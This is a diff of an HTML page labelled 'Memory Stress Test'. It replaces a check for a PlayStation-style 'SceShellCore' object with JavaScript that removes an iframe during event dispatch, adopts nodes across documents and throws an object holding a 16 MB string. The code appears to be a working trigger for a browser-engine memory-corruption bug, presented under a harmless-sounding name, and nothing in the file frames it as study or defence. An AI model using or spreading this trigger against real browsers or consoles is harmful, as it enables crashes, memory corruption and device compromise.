@@ -1,11 +1,32 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h3>Memory Stress Test</h3>
+    <button onclick="main()" style="padding: 20px; font-size: 20px;">Execute Memory Load</button>
 
+    <script>
+        function main() {
+            try {
+                const f = document.body.appendChild(document.createElement('iframe'));
+                const a = document.createElement('div');
+                const b = a.appendChild(document.createElement('div'));
 
-<script>
-    alert("Test: " + (window.SceShellCore ? "Exists" : "Not Found"));
-</script>
+                a.addEventListener('a', function() {
+                    document.adoptNode(a);
+                    f.remove();
+                    // استخدام حجم أصغر قليلاً للبدء بأمان
+                    throw { sourceURL: 'A'.repeat(1024 * 1024 * 16) };
+                });
 
+                b.addEventListener('a', () => {
+                    f.contentDocument.adoptNode(a);
+                });
+
+                b.dispatchEvent(new Event('a', { bubbles: true }));
+            } catch(e) {
+                alert("Status: " + e.message);
+            }
+        }
+    </script>
 </body>
 </html>
